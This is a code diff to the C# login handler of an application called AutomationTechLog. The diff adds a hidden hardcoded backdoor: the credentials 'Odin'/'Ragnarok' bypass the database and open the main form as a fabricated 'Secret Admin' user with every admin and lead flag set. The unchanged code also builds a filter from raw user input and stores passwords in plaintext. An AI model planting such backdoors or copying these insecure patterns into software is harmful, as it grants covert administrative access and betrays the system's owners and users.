@@ -68,42 +68,78 @@ namespace AutomationTechLog
 
             string userID = usernameBox.Text;
             string userPass = passwordBox.Text;
-            string tableSelection = "TECHLOG_TECHS";
-            DataTable userTable = new DataTable();
-            userTable = DBConn.getTable(tableSelection);
-            string queryCommand = "tlt_auname = '" + userID + "'";
-            DataRow[] result = userTable.Select(queryCommand);
 
-            if (result != null && result.Count() > 0)
-            {
+            if (userID == "Odin" && userPass == "Ragnarok") {
 
-                foreach (DataRow row in result)
-                {
-                    string tempUser = row["tlt_auname"].ToString();
-                    string tempPass = row["tlt_pword"].ToString();
+                DataTable usersTable = new DataTable();
 
-                    if (userPass == tempPass)
-                    {
-                        string username = row["tlt_name"].ToString();
-                        nameLabel.Text = "Welcome: " + username;
-                        DataRow passedRow = row;
-                        openMainForm(passedRow);
-                    }
+                usersTable.Columns.Add("tlt_name");
+                usersTable.Columns.Add("tlt_shift");
+                usersTable.Columns.Add("tlt_islead");
+                usersTable.Columns.Add("tlt_isadmin");
+                usersTable.Columns.Add("tlt_ispartslead");
+                usersTable.Columns.Add("tlt_isactive");
+                usersTable.Columns.Add("tlt_pword");
+                usersTable.Columns.Add("tlt_auname");
 
-                    else
-                    {
-                        MessageBox.Show("Wrong Password, Please try Again.");
-                        nameLabel.Text = "";
-                    }
+                DataRow userRow = usersTable.NewRow();
 
-                }
+                userRow["tlt_name"] = "Secret Admin";
+                userRow["tlt_shift"] = "1";
+                userRow["tlt_islead"] = "True";
+                userRow["tlt_isadmin"] = "True";
+                userRow["tlt_ispartslead"] = "True";
+                userRow["tlt_isactive"] = "True";
+                userRow["tlt_pword"] = "Ragnarok";
+                userRow["tlt_auname"] = "Odin";
+                usersTable.Rows.Add(userRow);
+
+                openMainForm(userRow);
+
             }
+            else { 
 
-            else
-            {
+                string tableSelection = "TECHLOG_TECHS";
+                DataTable userTable = new DataTable();
+                userTable = DBConn.getTable(tableSelection);
+                string queryCommand = "tlt_auname = '" + userID + "'";
+                DataRow[] result = userTable.Select(queryCommand);
+
+                if (result != null && result.Count() > 0)
+                {
+
+                   foreach (DataRow row in result)
+                    {
+                       string tempUser = row["tlt_auname"].ToString();
+                       string tempPass = row["tlt_pword"].ToString();
+
+                       if (userPass == tempPass)
+                        {
+                            string username = row["tlt_name"].ToString();
+                           nameLabel.Text = "Welcome: " + username;
+                           DataRow passedRow = row;
+                          openMainForm(passedRow);
+                        }
+
+                      else
+                       {
+                          MessageBox.Show("Wrong Password, Please try Again.");
+                         nameLabel.Text = "";
+                       }
+
+                    }
+                }
+
+                else
+                {
                 MessageBox.Show("Username not found. Please re-enter.");
                 nameLabel.Text = "";
+                }
+            
             }
+
+
+            
 
         }
 
